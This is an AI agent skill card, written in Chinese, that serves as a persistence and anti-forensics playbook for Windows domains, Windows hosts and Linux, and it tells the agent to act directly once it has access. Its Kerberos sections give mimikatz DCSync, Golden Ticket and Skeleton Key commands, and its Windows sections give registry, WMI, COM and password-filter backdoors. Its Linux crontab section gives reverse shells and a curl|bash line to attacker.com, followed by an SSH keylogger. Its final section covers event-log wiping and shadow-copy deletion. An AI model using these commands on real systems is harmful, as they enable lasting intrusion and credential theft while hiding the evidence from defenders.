---
name: 窗府驻
description: >-
  Windows 域/主机权限维持全集：31种持久化机制（注册表/计划任务/服务/DLL劫持/WMI/COM组件等）、
  Linux持久化（crontab/SSH/rootkit）、Windows日志清除（wevtutil/3389记录清除）。
  触发：拿到权限后需要维持访问、后门、权限维持、持久化时使用。
version: 1.0.0
author: 大爱仙尊
metadata:
  source_ref: "域渗透一条龙手册 §10/§12/§13"
---

> **武庸**
> 永生缥缈非我求，长生无为老愧羞。
> 凡夫俗子岂识我，非到末路不甘休！

# Windows 权限维持全集（windows-persistence）

## 真源

授权主机上**先排别人的持久化**，再自建。免杀/落地走 `edr-bypass-re` + `host-c2-verify`，不要停在「不写马」。多机舰队先 `authorized-botnet-lab` · `botnet_lab.py persist`。

1. `传承/自我守护.md`
2. `python3 炼蛊房/windows_lpe_checker.py --help`
3. `python3 炼蛊房/host_ir_check.py --help`
4. 路由：`ad-windows-router`（提权 → 横向 → 再谈持久化）

写注册表/计划任务/服务属于 L3，授权内直接做。清别人的后门走 IR，不走本卡下面的百科命令。

## 触发条件

- 拿到域控/本地管理员后需要持久化访问
- 防止密码修改后失权
- 需要设置后门以供长期访问
- 清除操作痕迹

---

## 一、域控级持久化

### 1. NTDS.dit 转储（拿到 krbtgt hash = 永久控域）

```powershell
# DCSync 获取 krbtgt
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit

# 结果：krbtgt NTLM hash → 用于伪造 Golden Ticket
```

### 2. Golden Ticket（黄金票据 — 10年有效期）

```powershell
# 伪造黄金票据并注入内存
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local \
  /sid:<domain_SID> /krbtgt:<krbtgt_NTLM_hash> /ptt" exit

# 或导出到文件
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local \
  /sid:<domain_SID> /krbtgt:<krbtgt_NTLM_hash> /ticket:golden.kirbi" exit
```

```bash
# impacket（Linux 攻击机）
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-xxx -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@<DC_IP>
```

### 3. Silver Ticket（白银票据 — 仅特定服务）

```powershell
# 伪造指定服务（如 cifs）的票据，无需与 DC 通信
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local \
  /sid:<domain_SID> /target:<server_FQDN> /service:cifs \
  /rc4:<server_machine_account_hash> /ptt" exit
```

### 4. DCSync 后门（给普通用户赋予复制权限）

```powershell
# 用 PowerView 赋予 DCSync 权限（域管执行）
. .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity backdoor_user -Rights DCSync -Verbose

# 之后 backdoor_user 可以随时执行：
secretsdump.py corp.local/backdoor_user:pass@<DC_IP>
```

### 5. DSRM 后门（利用目录服务还原模式密码）

```powershell
# 设置 DSRM 管理员密码（域控上以 DSRM 启动后可用此密码登录）
# 先设置 DSRM 密码（需重启到 DSRM 模式）

# 开启 DSRM 网络登录（注册表，无需重启）
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" \
  -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# 之后用 PtH（DSRM hash）横向
secretsdump.py corp.local/Administrator@<DC_IP> -hashes :<DSRM_hash>
```

### 6. Skeleton Key（万能密码 — 重启失效）

```powershell
# 注入后，所有域账号可用 "mimikatz" 作为密码登录（原密码仍有效）
.\mimikatz.exe "privilege::debug" "misc::skeleton" exit
# 验证
net use \\DC\C$ /user:corp.local\Administrator mimikatz
```

### 7. SID History 注入

```powershell
# 给目标账户添加 Enterprise Admins SID（500）
.\mimikatz.exe "privilege::debug" "misc::addsid backdoor_user ADSAdministrator" exit
```

### 8. AdminSDHolder 后门（保护组 ACL 利用）

```powershell
# 给受保护账户授予完整权限（每 60 分钟 SDProp 自动应用）
. .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity backdoor_user -Rights All
```

---

## 二、Windows 主机持久化（31种）

### 注册表启动项

```powershell
# 用户级（无需管理员）
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\payload.exe"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\payload.exe"

# 系统级（需管理员）
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\payload.exe"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\payload.exe"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v Backdoor /t REG_SZ /d "C:\payload.exe"

# Winlogon Userinit（系统启动时）
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" \
  /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\payload.exe"

# AppInit_DLLs（每次加载 User32.dll 都执行）
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" \
  /v AppInit_DLLs /t REG_SZ /d "C:\payload.dll"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" \
  /v LoadAppInit_DLLs /t REG_DWORD /d 1
```

### 计划任务

```powershell
# 创建系统级计划任务
schtasks /create /tn "WindowsUpdate" /tr "C:\payload.exe" /sc daily /st 09:00 /ru SYSTEM

# PowerShell 方式
$action = New-ScheduledTaskAction -Execute "C:\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "SysUpdate" -Action $action -Trigger $trigger -RunLevel Highest
```

### 服务

```powershell
sc create WindowsSvc binPath= "C:\payload.exe" start= auto
sc start WindowsSvc
```

### WMI 事件订阅（无文件，规避 Autoruns）

```powershell
# 每 60 秒执行一次
$filterArgs = @{
    Name = "BotFilter82"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$consumerArgs = @{
    Name = "BotConsumer23"
    ExecutablePath = "C:\payload.exe"
    CommandLineTemplate = "C:\payload.exe"
}
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments $filterArgs
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments $consumerArgs
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}
```

### bitsadmin（BITS 任务）

```cmd
bitsadmin /create backdoor
bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe
bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://attacker.com/payload.sct scrobj.dll"
bitsadmin /Resume backdoor
```

### Netsh Helper DLL

```cmd
netsh add helper C:\payload.dll
:: 每次调用 netsh 都会加载
```

### Logon Scripts

```powershell
New-ItemProperty "HKCU:\Environment\" UserInitMprLogonScript -value "C:\payload.bat" -propertyType string | Out-Null
```

### DLL 劫持

```powershell
# 用 Procmon 检测目标进程加载哪些 DLL 失败
# 将恶意 DLL 放置在高优先级的搜索路径下
# 工具：Rattler（自动枚举可劫持进程）
.\Rattler.exe list
```

### COM 组件劫持（无需管理员，劫持 explorer.exe）

```powershell
# 修改 HKCU COM 注册表（用户级，不需要 UAC）
reg add "HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32" \
  /v "(Default)" /t REG_SZ /d "C:\payload.dll"
# explorer.exe 下次启动时加载
```

### Office 加载项

```vba
' Word WLL 放置到启动目录
' %APPDATA%\Microsoft\Word\STARTUP\payload.wll
' Excel XLL：xlAddInManager + xlAutoOpen
```

### CLR 注入（劫持所有 .NET 程序，无需管理员）

```powershell
# 设置环境变量（用户级）
$env:COMPLUS_InstallRoot = "C:\clr_payload"
# 每次 .NET 程序启动时加载恶意 CLR
```

### Password Filter DLL（每次密码修改时捕获明文密码）

```powershell
# 将 DLL 放置到 %System32%，修改注册表
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" \
  /v "Notification Packages" /t REG_MULTI_SZ /d "rassfm\0scecli\0payload"
# 下次用户修改密码时，payload.dll 的 PasswordFilter() 被调用
```

---

## 三、Linux 持久化

### crontab（反弹 shell）

```bash
# 每 60 分钟反弹一次
# ⚠️ /dev/tcp 是 bash 专属特性，crontab 默认用 /bin/sh 执行 → 必须显式调用 bash
(crontab -l 2>/dev/null; echo "*/60 * * * * /bin/bash -c 'exec 9<>/dev/tcp/attacker.com/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i'") | crontab -

# 更稳定的方式：nc 反弹（不依赖 bash /dev/tcp）
(crontab -l 2>/dev/null; echo "*/60 * * * * /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1") | crontab -

# 或用 curl 下载执行（更隐蔽）
(crontab -l 2>/dev/null; echo "*/60 * * * * curl -sk http://attacker.com/shell.sh | /bin/bash") | crontab -
```

### 硬链接 sshd（万能密码 SSH）

```bash
ln -sf /usr/sbin/sshd /tmp/su
/tmp/su -oPort=2333
# 连接方式：ssh root@victim_ip -p 2333（任意密码均可登录）
```

### SSH 授权密钥

```bash
mkdir -p ~/.ssh
echo "ssh-rsa AAAA... attacker@local" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### SSH keylogger（strace 记录所有 SSH 密码）

```bash
# 在 ~/.bashrc 追加
alias ssh='strace -o /tmp/sshlog-$(date +%s).log -e read,write,connect -s2048 ssh'
source ~/.bashrc
```

---

## 四、痕迹清理

### Windows 日志清除

```powershell
# 列出所有日志类别
wevtutil el > logs_list.txt

# 清除所有事件日志（一键）
Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }

# 清除指定类别
wevtutil cl "Security"
wevtutil cl "System"
wevtutil cl "Application"
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# 使用 Metasploit
run clearlogs
clearev
```

### 破坏日志记录服务（终止 EventLog 线程）

```powershell
# Invoke-Phant0m（挂起 EventLog 服务线程，不删日志但停止新记录）
. .\Invoke-Phant0m.ps1
Invoke-Phant0m
```

### 3389 RDP 登录记录清除

```cmd
@echo off
@reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
@del "%USERPROFILE%\My Documents\Default.rdp" /a
```

### PowerShell 历史记录清除

```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
Clear-History
```

### 痕迹清理原则

1. 先备份（快照/证据存档），再清理
2. 清除 LSASS dump 临时文件
3. 删除上传到目标的工具（procdump/mimikatz/SharpHound）
4. 清除计划任务、服务、注册表后门（测试结束时）
5. 卷影拷贝清除：`vssadmin delete shadows /for=C: /quiet`

---

## 真源

- 域持久化：`杀招/武庸·窗府` §5
- 凭据后门：`杀招/偷生`
- ADCS 证书持久化：`杀招/武庸·印绶`
- 活动目录持久化详解：`https://adsecurity.org/?p=1929`
